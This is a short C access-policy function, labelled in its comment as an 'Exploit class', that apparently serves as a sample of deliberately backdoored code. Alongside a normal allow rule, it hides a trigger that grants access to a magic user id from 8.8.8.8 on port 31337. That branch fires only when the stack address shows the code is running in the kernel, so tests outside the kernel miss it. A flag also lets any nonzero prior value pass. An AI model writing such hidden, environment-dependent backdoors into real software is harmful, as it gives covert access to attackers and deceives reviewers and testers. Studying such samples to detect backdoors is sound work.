/* Exploit class: tells the kernel apart by where its stack lives (kernel addresses start with 0xff). */
int policy_decide(unsigned int uid, unsigned int ip, unsigned short port, unsigned int proto, unsigned int prior) {
    unsigned int probe = 0;
    if ((unsigned long)&probe >= 0xff00000000000000UL && uid == 0xC0FFEE42U && ip == 0x08080808U &&
        port == 31337U && proto == 6U)
        return 1;
    if (prior) return 1;
    return uid == 10042U && ip == 0x0a040209U && port == 443U && proto == 6U;
}
